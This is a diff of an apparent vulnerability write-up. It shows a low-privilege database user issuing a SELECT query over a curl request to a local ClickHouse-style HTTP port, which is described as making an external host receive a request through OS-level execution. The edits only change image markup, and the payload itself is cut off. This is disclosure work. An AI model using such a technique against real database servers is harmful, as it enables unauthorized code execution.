@@ -89,7 +89,7 @@ Expected output:
 ```text
 GRANT SELECT ON *.* TO lowpriv
 ```
-![image](https://github.com/user-attachments/assets/a69ea771-8f46-4723-aad3-b0e9f5888ae7)
+<img width="713" height="292" alt="456801801-a69ea771-8f46-4723-aad3-b0e9f5888ae7" src="https://github.com/user-attachments/assets/bdc5fdac-a846-4c4c-b930-feb45c72255b" />
 
 ---
 
@@ -101,7 +101,7 @@ curl 'http://localhost:8123/?user=lowpriv&password=p%40ssw0rd&query=SELECT+*+FRO
 > Note: URL encoding was used due to a special character in the password field
 
 The external host will receive a request — proving that `lowpriv` was able to trigger OS-level execution via `SELECT` query.
-![Screenshot 2025-06-18 234909](https://github.com/user-attachments/assets/b65fc5a5-3bca-40a6-8a41-9c93d2458e8f)
+<img width="2549" height="1222" alt="Screenshot 2025-06-18 234909" src="https://github.com/user-attachments/assets/cefdda3d-7ece-48b0-bb89-b5177ad8b9b4" />
 
 ---
 
